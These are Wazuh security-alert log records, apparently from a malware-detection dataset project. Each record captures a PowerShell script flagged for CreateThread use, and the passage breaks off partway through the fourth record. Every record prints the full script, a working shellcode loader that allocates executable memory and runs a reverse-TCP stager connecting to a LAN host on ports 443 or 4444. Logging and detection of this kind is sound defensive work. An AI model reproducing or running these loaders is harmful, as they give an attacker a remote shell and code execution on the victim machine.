{"timestamp":"2026-07-06T02:22:08.469+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":215,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304528.4302246","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:28.3398869Z","eventRecordID":"145941","processID":"7796","threadID":"8844","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x22,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 8cb90a51-ac0e-44f7-9f9a-83668fa19d1c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\66.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x22,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"8cb90a51-ac0e-44f7-9f9a-83668fa19d1c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\66.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:08.543+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":216,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304528.4313187","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:29.0918515Z","eventRecordID":"145945","processID":"8188","threadID":"5452","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x58,0xaf,0x16,0x09,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 0580d5aa-7b28-4677-a881-18776e845329\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\67.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x58,0xaf,0x16,0x09,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"0580d5aa-7b28-4677-a881-18776e845329","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\67.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:09.564+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":217,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304529.4324128","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:29.8868460Z","eventRecordID":"145950","processID":"4672","threadID":"264","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x38,0x83,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 41e63465-f7f5-488f-b5a0-565f38f2e685\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\680.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x38,0x83,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"41e63465-f7f5-488f-b5a0-565f38f2e685","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\680.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:10.898+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":218,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304530.4335071","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:30.7635545Z","eventRecordID":"145955","processID":"9036","threadID":"8728","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x16,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 75011030-ead2-4fed-bfc3-d4884e42d656\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\682.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr 